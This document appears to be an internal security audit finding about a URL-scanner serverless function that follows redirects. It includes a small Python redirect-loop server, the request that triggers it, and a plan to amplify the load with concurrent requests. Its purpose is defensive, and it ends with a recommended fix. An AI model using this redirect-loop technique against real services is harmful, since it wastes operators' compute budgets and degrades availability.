# Attack 10 — Redirect Chain Abuse

## Status: LOW RISK — minor hardening recommended

## Description
`scan.js` uses `redirect: 'follow'` when fetching target URLs, which means the fetch follows all redirects automatically. An attacker-controlled server can issue an arbitrarily long redirect chain to waste function execution time and consume Netlify function invocation budget.

## Evidence
```bash
# httpbin.org/redirect/20 issues 20 sequential redirects
POST /scan {"url":"https://httpbin.org/redirect/20"}
→ {"score":0,"grade":"F",...}  # successfully followed all 20 redirects
```
The scan completed — 20 redirects were followed, each adding ~100-200ms latency.

## Attack Steps

### Step 1 — Set up a redirect server
```python
# redirect_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    count = 0
    def do_GET(self):
        H.count += 1
        self.send_response(302)
        self.send_header('Location', f'https://myserver.com/redirect/{H.count}')
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
```

### Step 2 — Submit the redirect URL
```bash
POST /scan {"url":"https://myserver.com/redirect/1"}
```

The scan function follows: `/redirect/1` → `/redirect/2` → ... until:
- The 10-second Netlify function timeout fires (returns timeout error)
- Node's fetch hits an internal redirect limit (typically 20)

### Step 3 — Amplify with concurrent requests
With no rate limiting (Attack 05), send 50 concurrent redirect-loop requests to consume all available function instances.

## Severity: LOW

Node.js `fetch` with `redirect: 'follow'` has a built-in limit of 20 redirects. After 20 redirects, it throws a `max redirect` error, which our error handler catches gracefully. The timeout is also bounded by Netlify's 10s function limit.

This is only meaningful at scale combined with the rate limiting issue.

## What to fix

### Fix — Cap redirects at 5 in scan.js
```js
// In scan.js, change the fetch call:
const response = await fetch(targetUrl, {
  method: 'GET',
  redirect: 'follow',
  signal: AbortSignal.timeout(8000),
  headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SecureHeaders-Scanner/1.0)' },
  // Add: max redirects cap (not available in native fetch — use manual tracking)
});
```

Native `fetch` doesn't expose a max-redirects option. Alternative: use `redirect: 'manual'` and handle redirects manually with a counter, or accept the built-in 20-redirect cap as sufficient.

**Recommended**: Leave as-is (Node's 20-redirect cap is reasonable). Fix rate limiting (Attack 05) instead, which addresses the root amplification concern.
